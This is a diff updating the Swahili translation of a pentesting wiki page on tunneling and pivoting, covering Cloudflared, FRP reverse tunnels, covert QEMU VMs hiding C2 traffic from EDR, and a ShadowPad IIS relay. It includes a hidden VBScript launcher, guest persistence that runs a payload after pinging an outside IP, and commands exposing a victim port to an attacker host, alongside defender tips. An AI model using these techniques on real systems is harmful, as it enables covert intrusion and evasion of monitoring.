 cloudflared tunnel create mytunnel
 cloudflared tunnel route dns mytunnel internal.example.com
@@ -603,17 +604,17 @@ Tunnel: <TUNNEL-UUID>
 credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
 url: http://127.0.0.1:8000
 ```
-Anzisha kiunganishi:
+Anzisha connector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Kwa sababu trafiki zote kutoka kwenye host hutoka **nje kwa 443**, Cloudflared tunnels ni njia rahisi ya kupita kando ya ingress ACLs au mipaka ya NAT. Fahamu kwamba binary kwa kawaida huendesha kwa cheo kilichoinuliwa – tumia containers au the `--user` flag pale inapowezekana.
+Kwa kuwa traffic yote huondoka kwenye host **outbound kupitia 443**, Cloudflared tunnels ni njia rahisi ya kupita ingress ACLs au mipaka ya NAT. Kumbuka kuwa binary kwa kawaida huendeshwa ikiwa na privileges za juu – tumia containers au flag ya `--user` inapowezekana.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) ni reverse-proxy ya Go inayodumishwa kwa uendelevu ambayo inaunga mkono **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Kuanzia **v0.53.0 (May 2024)** inaweza kutumika kama **SSH Tunnel Gateway**, hivyo host lengwa inaweza kuanzisha reverse tunnel kwa kutumia tu client ya stock OpenSSH – hakuna binary ya ziada inayohitajika.
+[`frp`](https://github.com/fatedier/frp) ni reverse-proxy ya Go inayodumishwa kikamilifu na inayotumia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia **v0.53.0 (Mei 2024)** inaweza kufanya kazi kama **SSH Tunnel Gateway**, hivyo target host inaweza kuanzisha reverse tunnel kwa kutumia stock OpenSSH client pekee – bila kuhitaji binary ya ziada.
 
-### Tuneli ya reverse TCP ya jadi
+### Classic reverse TCP tunnel
 ```bash
 # Attacker / server
 ./frps -c frps.toml            # listens on 0.0.0.0:7000
@@ -632,7 +633,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Kutumia SSH gateway mpya (hakuna binary ya frpc)
+### Kutumia gateway mpya ya SSH (bila binary ya frpc)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -641,13 +642,13 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Amri iliyo hapo juu inachapisha bandari ya mwathirika **8080** kama **attacker_ip:9000** bila kusambaza zana zozote za ziada — inafaa kwa living-off-the-land pivoting.
+Amri iliyo hapo juu huchapisha port ya victim **8080** kama **attacker_ip:9000** bila ku-deploy tooling ya ziada – inafaa kwa pivoting ya living-off-the-land.
 
-## Mifereji ya siri za VM kwa kutumia QEMU
+## Covert VM-based Tunnels with QEMU
 
-Mitandao ya user-mode ya QEMU (`-netdev user`) inaunga mkono chaguo linaloitwa `hostfwd` ambalo **linahusisha bandari ya TCP/UDP kwenye *host* na kuisogeza ndani ya *guest***. Wakati *guest* inapoendesha SSH daemon kamili, kanuni ya `hostfwd` inakupa disposable SSH jump box inayekaa kabisa ndani ya VM ya muda — kamili kwa kuficha C2 traffic kutoka kwa EDR kwa sababu shughuli zote haribifu na mafaili zinabaki kwenye diski ya virtual.
+QEMU’s user-mode networking (`-netdev user`) inasaidia option inayoitwa `hostfwd` ambayo **hufunga port ya TCP/UDP kwenye *host* na ku-forward kwenda ndani ya *guest***. Guest inapokuwa inaendesha SSH daemon kamili, rule ya hostfwd hukupa SSH jump box ya muda inayokaa kikamilifu ndani ya VM ya ephemeral – inafaa kabisa kuficha traffic ya C2 kutoka kwa EDR kwa sababu shughuli na files zote hasidi hubaki kwenye virtual disk.<sup>[[1]](#references)</sup>
 
-### Mstari mfupi
+### One-liner ya haraka
 ```powershell
 # Windows victim (no admin rights, no driver install – portable binaries only)
 qemu-system-x86_64.exe ^
@@ -657,51 +658,51 @@ qemu-system-x86_64.exe ^
 -device e1000,netdev=n0 ^
 -nographic
 ```
-• Amri iliyotajwa hapo juu inaanzisha imaji ya **Tiny Core Linux** (`tc.qcow2`) katika RAM.
-• Bandari **2222/tcp** kwenye Windows host inapelekwa kwa uwazi hadi **22/tcp** ndani ya guest.
-• Kwa mtazamo wa mshambuliaji, lengo linaonyesha tu bandari 2222; paketi zozote zinazofika zinashughulikiwa na SSH server inayotekelezwa ndani ya VM.
+• Amri iliyo hapo juu inaanzisha image ya **Tiny Core Linux** (`tc.qcow2`) kwenye RAM.
+• Port **2222/tcp** kwenye Windows host ina-forward kwa uwazi kwenda **22/tcp** ndani ya guest.
+• Kwa mtazamo wa mshambuliaji, target inaonyesha port 2222 pekee; packets zozote zinazofika hapo zinashughulikiwa na SSH server inayoendesha ndani ya VM.
 
-### Kuzindua kimyakimya kupitia VBScript
+### Kuanzisha kwa stealth kupitia VBScript
 ```vb
 ' update.vbs – lived in C:\ProgramData\update
 Set o = CreateObject("Wscript.Shell")
 o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
 ```
-Running the script with `cscript.exe //B update.vbs` keeps the window hidden.
+Kuendesha script kwa `cscript.exe //B update.vbs` kunaendelea kuficha dirisha.
 
-### Uendelevu ndani ya guest
+### Persistence ndani ya guest
 
-Because Tiny Core is stateless, attackers usually:
+Kwa sababu Tiny Core haina hali ya kudumu, attackers kwa kawaida:
 
-1. Drop payload to `/opt/123.out`
-2. Append to `/opt/bootlocal.sh`:
+1. Weka payload kwenye `/opt/123.out`
+2. Ongeza kwenye `/opt/bootlocal.sh`:
 
 ```sh
 while ! ping -c1 45.77.4.101; do sleep 2; done
 /opt/123.out
 ```
 
-3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.
+3. Ongeza `home/tc` na `opt` kwenye `/opt/filetool.lst` ili payload ifungashwe kwenye `mydata.tgz` wakati wa kuzima.
 
-### Kwa nini hili linaepuka kugunduliwa
+### Kwa nini hii hukwepa detection
 
-• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
-• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
-• Memory scanners never analyse the malicious process space because it lives in a different OS.
+• Ni executables mbili tu ambazo hazijasainiwa (`qemu-system-*.exe`) zinazogusa disk; hakuna drivers au services zinazosakinishwa.
+• Security products kwenye host huona **benign loopback traffic** (C2 halisi hukatisha muunganisho ndani ya VM).
+• Memory scanners hazichanganui kamwe process space hasidi kwa sababu iko kwenye OS tofauti.
 
-### Vidokezo kwa watetezi
+### Vidokezo kwa Defender
 
-• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
-• Block outbound connections that originate from `qemu-system*.exe`.  
-• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.
+• Toa alert kuhusu **QEMU/VirtualBox/KVM binaries zisizotarajiwa** zilizo kwenye paths zinazoweza kuandikwa na user.
+• Zuia outbound connections zinazotoka kwenye `qemu-system*.exe`.
+• Tafuta listening ports adimu (2222, 10022, …) zinazobind mara tu baada ya QEMU kuzinduliwa.
 
-## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)
+## IIS/HTTP.sys relay nodes kupitia `HttpAddUrl` (ShadowPad)
 
-Ink Dragon’s ShadowPad IIS module turns every compromised perimeter web server into a dual-purpose **backdoor + relay** by binding covert URL prefixes directly at the HTTP.sys layer:
+IIS module ya ShadowPad ya Ink Dragon hubadilisha kila perimeter web server iliyoathirika kuwa **backdoor + relay** yenye matumizi mawili kwa kubind URL prefixes zilizofichwa moja kwa moja kwenye layer ya HTTP.sys:<sup>[[3]](#references)</sup>
 
-* **Config defaults** – if the module’s JSON config omits values, it falls back to believable IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). That way benign traffic is answered by IIS with the correct branding.
-* **Wildcard interception** – operators supply a semicolon-separated list of URL prefixes (wildcards in host + path). The module calls `HttpAddUrl` for each entry, so HTTP.sys routes matching requests to the malicious handler *before* the request reaches IIS modules.
-* **Encrypted first packet** – the first two bytes of the request body carry the seed for a custom 32-bit PRNG. Every subsequent byte is XOR-ed with the generated keystream before protocol parsing:
+* **Config defaults** – ikiwa JSON config ya module haijumuishi values, hutumia IIS defaults zinazoaminika (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Kwa njia hiyo, benign traffic hujibiwa na IIS ikiwa na branding sahihi.
+* **Wildcard interception** – operators hutoa orodha iliyotenganishwa kwa semicolon ya URL prefixes (wildcards kwenye host + path). Module huita `HttpAddUrl` kwa kila entry, hivyo HTTP.sys hupeleka requests zinazolingana kwa malicious handler *kabla* request haijafikia IIS modules.
+* **Encrypted first packet** – bytes mbili za kwanza za request body hubeba seed ya custom 32-bit PRNG. Kila byte inayofuata hu-XOR-iwa na keystream inayozalishwa kabla ya protocol parsing:
 
 ```python
 def decrypt_first_packet(buf):
@@ -715,20 +716,20 @@ out[i] ^= num & 0xFF
 return out
 ```
 
-* **Relay orchestration** – the module maintains two lists: “servers” (upstream nodes) and “clients” (downstream implants). Entries are pruned if no heartbeat arrives within ~30 seconds. When both lists are non-empty, it pairs the first healthy server with the first healthy client and simply pipes bytes between their sockets until one side closes.
-* **Debug telemetry** – optional logging records source IP, destination IP, and total forwarded bytes for each pairing. Investigators used those breadcrumbs to rebuild the ShadowPad mesh spanning multiple victims.
+* **Relay orchestration** – module hudumisha lists mbili: “servers” (upstream nodes) na “clients” (downstream implants). Entries huondolewa ikiwa hakuna heartbeat inayofika ndani ya takriban sekunde 30. Lists zote mbili zikiwa si tupu, huunganisha server ya kwanza yenye afya na client ya kwanza yenye afya, kisha hupitisha bytes kati ya sockets zao hadi upande mmoja ufunge muunganisho.
+* **Debug telemetry** – logging ya hiari hurekodi source IP, destination IP, na jumla ya bytes zilizoforwardiwa kwa kila pairing. Investigators walitumia breadcrumbs hizo kujenga upya ShadowPad mesh iliyokuwa ikienea kwenye victims wengi.
 
 ---
 
-## Zana nyingine za kuangalia
+## Other tools to check
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
-## Marejeleo
+## References
 
-- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
-- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
-- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 
 {{#include ../banners/hacktricks-training.md}}
